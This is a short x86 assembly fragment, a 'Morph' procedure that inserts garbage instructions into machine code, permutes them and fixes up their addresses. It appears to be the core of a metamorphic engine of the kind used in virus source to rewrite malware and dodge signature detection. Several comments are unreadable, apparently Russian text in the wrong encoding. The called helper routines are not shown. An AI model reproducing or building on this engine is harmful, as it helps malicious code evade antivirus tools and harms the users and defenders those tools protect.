; ����⢥��� ᠬ� ��楤��-�����
; Morpher

Morph	proc	; ESi - SRC, EDi - DST, Returns: ECX - new size
	push	edi
xMorph:	cmp	esi,[MaxMorph][ebp]			; �� ���� ��諨 ?
	ja	AllDone					; Some data more ?
	
	Call	CheckBlock				; Code ?
	jc	SkipByte

	Call	DoGarble

	Call	CheckVariable
	Call	CheckAddr
	Call	CheckDataAddr
	Call	CheckTblAddr

	Call	GetSize32			; ���. ������ ��������

	push	eax
	Call    Mutate				; Permutate instruction
	pop	ecx				; (if possible)
	jnc     AddGarb				; Permutated ?
rep	movsb					; Just copy
AddGarb:
;	Call	DoGarble
	mov	[GarbLvl][ebp],0
	jmp	xMorph
SkipByte:
	Call	CheckVariable
	Call	CheckAddr
	Call	CheckDataAddr
	Call	CheckTblAddr
	movsb					; �����. �����㥬 ����
						; Data. Copy byte
	jmp	xMorph
AllDone:
	pop	eax
	sub	edi,eax				; �����⠥� ���� ࠧ���
	xchg	edi,ecx
	ret
Morph	endp
